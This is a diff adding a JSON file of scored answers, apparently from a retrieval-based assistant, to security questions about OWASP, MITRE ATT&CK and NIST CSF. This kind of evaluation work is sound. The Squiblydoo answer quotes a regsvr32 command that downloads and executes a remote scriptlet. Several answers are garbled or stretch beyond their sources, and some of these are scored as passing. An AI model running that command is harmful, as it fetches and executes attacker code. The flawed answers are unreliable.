@@ -1,0 +1,238 @@
+[
+  {
+    "question": "What is A01 Broken Access Control?",
+    "variant": "strict",
+    "answer": "According to the OWASP Top 10 2021.pdf, page 7:\n\nA01:2021 \u2013 Broken Access Control \n\nThis vulnerability occurs when an application allows an attacker to access or modify data that they shouldn't be able to. In other words, it's a flaw in how the application controls access to its resources.\n\nExample Scenario:\nAn application uses unverified data in a structured query language (SQL) call that is accessing account information:\npstmt.setString(1, request.getParameter(\"acct\"));\nResultSet results = pstmt.executeQuery( );\nAn attacker simply modifies the browser's 'acct' parameter to send whatever account number they want. \nIf not correctly verified, the attacker can access any user's account. \nhttps://example.com/app/accountInfo?acct=notmyacct",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is A01 Broken Access Control?",
+    "variant": "loose",
+    "answer": "According to the OWASP Top 10 2021.pdf, page 7:\n\nA01:2021 \u2013 Broken Access Control \n\nBroken Access Control refers to a vulnerability where an application allows an attacker to access or modify data that they should not be able to access or modify. This can occur when an application does not properly verify user input or when access control checks are not implemented correctly.\n\nExample Scenario:\nAn application uses unverified data in a structured query language (SQL) call that is accessing account information:\npstmt.setString(1, request.getParameter(\"acct\"));\nResultSet results = pstmt.executeQuery( );\nAn attacker simply modifies the browser's 'acct' parameter to send whatever account number they want. If not correctly verified, the attacker can access any user's account.\nhttps://example.com/app/accountInfo?acct=notmyacct",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is T1059 Command-Line Interface?",
+    "variant": "strict",
+    "answer": "According to the source document, MITRE ATT&CK.pdf, page 26:\n\nThe definition of T1059 Command-Line Interface is not explicitly present in this snippet.\n\nHowever, it is mentioned that if we've used the \"whoami\" command in our red team operation, we can search that on the ATT&CK website and find that two techniques likely apply: System Owner/User Discovery (T1033) and Command-Line Interface (T1059).\n\nTherefore, I could not find this information in the documents.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.2,
+    "context_precision": 1.0,
+    "confidence": 0.64,
+    "passed": false,
+    "failed_dimensions": [
+      "answer_relevancy"
+    ]
+  },
+  {
+    "question": "What is T1059 Command-Line Interface?",
+    "variant": "loose",
+    "answer": "According to MITRE ATT&CK.pdf, Page 26:\n\nThe definition of T1059 Command-Line Interface is not explicitly stated in this snippet. However, it can be inferred that T1059 refers to the use of command-line interfaces (CLI) by an attacker.\n\nBut since a definition and example are present, I will explain the example first.\n\nIf we've used the \u201cwhoami\u201d command in our red team operation, we can search that on the ATT&CK website and find that two techniques likely apply: System Owner/User Discovery (T1033) and Command-Line Interface (T1059).\n\nNow, based on this context, I will provide a possible explanation for T1059:\n\nT1059 Command-Line Interface refers to the use of command-line interfaces by an attacker to interact with the system or gather information. This can include using commands such as \"whoami\", \"pwd\", or other similar tools to execute malicious activities.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.7,
+    "context_precision": 1.0,
+    "confidence": 0.815,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is the Identify function in NIST CSF 2.0?",
+    "variant": "strict",
+    "answer": "I could not find this information in the documents.",
+    "faithfulness": 0.5,
+    "answer_relevancy": 0.5,
+    "context_precision": 0.6,
+    "confidence": 0.525,
+    "passed": false,
+    "failed_dimensions": [
+      "faithfulness",
+      "answer_relevancy"
+    ]
+  },
+  {
+    "question": "What is the Identify function in NIST CSF 2.0?",
+    "variant": "loose",
+    "answer": "According to Figure 2 on Page 9 of the NIST Cybersecurity Framework 2.0.pdf, the IDENTIFY function is defined as:\n\n\"The Functions should be addressed concurrently. Actions that support GOVERN, IDENTIFY, PROTECT, and DETECT should all happen continuously...\"\n\nIn other words, the Identify function involves categorizing assets and understanding what they are.\n\nAn example of this function in action is: \"an organization will categorize assets under IDENTIFY and take steps to secure those assets under PROTECT.\" (Source: NIST Cybersecurity Framework 2.0.pdf, Page 9)",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is A02 Cryptographic Failures?",
+    "variant": "strict",
+    "answer": "According to the OWASP Top 10 2021.pdf, page 10:\n\nA02:2021 \u2013 Cryptographic Failures\n\nThis refers to a category of vulnerabilities related to cryptographic failures. \n\nMapped\nMax Incidence \nRate\nAvg Incidence \nRate\nAvg Weighted \nExploit\nAvg Weighted \nImpact\nTotal \nOccurrences\nTotal CVEs\n29\n46.44%\n4.49%\n7.29\n6.81\n233,788\n3,075\n\nNote: The numbers and percentages listed are related to the incidence and impact of cryptographic failures, but they do not provide a definition of what A02:2021 \u2013 Cryptographic Failures is.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.6,
+    "context_precision": 0.6,
+    "confidence": 0.68,
+    "passed": false,
+    "failed_dimensions": [
+      "answer_relevancy"
+    ]
+  },
+  {
+    "question": "What is A02 Cryptographic Failures?",
+    "variant": "loose",
+    "answer": "According to the OWASP Top 10 2021 document, page 10:\n\nA02:2021 \u2013 Cryptographic Failures refers to vulnerabilities that occur when cryptographic mechanisms are not properly implemented or managed. This can include issues such as data being transmitted in clear text, old or weak cryptographic algorithms being used, and improper key management.\n\nNote: The definition is provided on page 10 of the OWASP Top 10 2021 document.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is the Squiblydoo attack technique?",
+    "variant": "strict",
+    "answer": "I could not find this information in the documents.",
+    "faithfulness": 0.5,
+    "answer_relevancy": 0.2,
+    "context_precision": 0.6,
+    "confidence": 0.42,
+    "passed": false,
+    "failed_dimensions": [
+      "faithfulness",
+      "answer_relevancy"
+    ]
+  },
+  {
+    "question": "What is the Squiblydoo attack technique?",
+    "variant": "loose",
+    "answer": "According to MITRE ATT&CK.pdf (Page 18), the Squiblydoo attack technique is not explicitly defined in this context. However, based on the surrounding text and examples, it appears that Squiblydoo refers to a specific type of malicious activity involving the use of regsvr32.exe.\n\nTo provide more information, I will refer to another source: MITRE ATT&CK.pdf (Page 17). This page mentions Regsvr32 as an attack technique, but does not specifically define Squiblydoo. However, it provides an example of a malicious command line using regsvr32.exe:\n\n\"The attackers downloaded COM scriplets using regsvr32.exe:\nregsvr32 /s/n/u/i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll\"\n\nThis suggests that Squiblydoo may be related to the use of regsvr32.exe to download or execute malicious code.\n\nUnfortunately, without a clear definition in the provided context, I cannot provide a more detailed explanation.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is Registry Run Keys persistence technique?",
+    "variant": "strict",
+    "answer": "I could not find this information in the documents.",
+    "faithfulness": 0.5,
+    "answer_relevancy": 0.2,
+    "context_precision": 0.2,
+    "confidence": 0.32,
+    "passed": false,
+    "failed_dimensions": [
+      "faithfulness",
+      "answer_relevancy",
+      "context_precision"
+    ]
+  },
+  {
+    "question": "What is Registry Run Keys persistence technique?",
+    "variant": "loose",
+    "answer": "According to MITRE ATT&CK.pdf, Page 6:\n\nThe Registry Run Keys/Startup Folder technique is a method used by adversaries (in this case, APT19) to persist on a system. \n\nExample: One technique used by APT19 is Registry Run Keys/Startup Folder.\n\nSource document: MITRE ATT&CK.pdf\nPage number: 6",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.2,
+    "confidence": 0.65,
+    "passed": false,
+    "failed_dimensions": [
+      "context_precision"
+    ]
+  },
+  {
+    "question": "How can SQL injection be prevented?",
+    "variant": "strict",
+    "answer": "According to OWASP Top 10 2021.pdf, page 15:\n\nThe preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping Tools (ORMs).\n\nThis means that instead of directly interacting with the database using SQL queries, it's recommended to use an Application Programming Interface (API) that handles this interaction in a secure way. This approach can help prevent SQL injection attacks by avoiding the need for dynamic queries and parameterized interfaces are used.\n\nAdditionally, OWASP Top 10 2021.pdf, page 15 also recommends:\n\n* Use positive server-side input validation.\n* For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.\n* Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 1.0,
+    "confidence": 0.85,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "How can SQL injection be prevented?",
+    "variant": "loose",
+    "answer": "According to OWASP Top 10 2021.pdf, page 15, the preferred option for preventing SQL injection is to use a safe API that:\n\n* Avoids using the interpreter entirely\n* Provides a parameterized interface\n* Migrates to Object Relational Mapping Tools (ORMs)\n\nAdditionally, it's recommended to use positive server-side input validation and escape special characters using the specific escape syntax for that interpreter.",
+    "faithfulness": 0.95,
+    "answer_relevancy": 0.8,
+    "context_precision": 1.0,
+    "confidence": 0.91,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is the Protect function in NIST CSF 2.0?",
+    "variant": "strict",
+    "answer": "According to page 9 of the source document, \"NIST Cybersecurity Framework 2.0.pdf\", the definition of PROTECT (PR) is:\n\n\"Safeguards to manage the organization\u2019s cybersecurity risks are used.\"\n\nSource: NIST Cybersecurity Framework 2.0.pdf\nPage: 9",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is the Protect function in NIST CSF 2.0?",
+    "variant": "loose",
+    "answer": "According to Source: NIST Cybersecurity Framework 2.0.pdf, Page: 9:\n\nThe PROTECT (PR) function is defined as \"Safeguards to manage the organization\u2019s cybersecurity risks are used.\"\n\nThis means that the Protect function involves implementing measures to safeguard against and manage an organization's cybersecurity risks.\n\nAdditionally, on Page: 10, it is mentioned that once assets and risks are identified and prioritized, PROTECT supports the ability to protect those assets from potential threats.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What are mitigations for Brute Force attacks?",
+    "variant": "strict",
+    "answer": "According to MITRE ATT&CK.pdf, page 40:\n\nMitigations for Brute Force (LEFT) include:\n\n* Account lockout policies can mitigate Square Brute Force.\n\nSource: MITRE ATT&CK.pdf\nPage: 40",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What are mitigations for Brute Force attacks?",
+    "variant": "loose",
+    "answer": "According to MITRE ATT&CK.pdf (Page 40), mitigations for Brute Force attacks include:\n\n* Account lockout policies: This can help prevent or mitigate Brute Force attacks by limiting the number of login attempts a user can make before their account is locked.\n\nSource: MITRE ATT&CK.pdf, Page 40",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is the purpose of the ATT&CK Navigator?",
+    "variant": "strict",
+    "answer": "According to page 27 of MITRE ATT&CK.pdf, the ATT&CK Navigator can be used to compare techniques that a tool (like Cobalt Strike) can perform with the techniques that an adversary (in this case, OilRig) has used. \n\nThe purpose of the ATT&CK Navigator is to facilitate comparison and communication between teams by providing a common language for discussing threat tactics.",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  },
+  {
+    "question": "What is the purpose of the ATT&CK Navigator?",
+    "variant": "loose",
+    "answer": "According to MITRE ATT&CK.pdf, page 27:\n\nThe ATT&CK Navigator is used to compare techniques that can be performed with a tool (such as Cobalt Strike) to the techniques that are known to have been used by a specific threat actor (in this case, OilRig).",
+    "faithfulness": 0.8,
+    "answer_relevancy": 0.8,
+    "context_precision": 0.6,
+    "confidence": 0.75,
+    "passed": true,
+    "failed_dimensions": []
+  }
+]
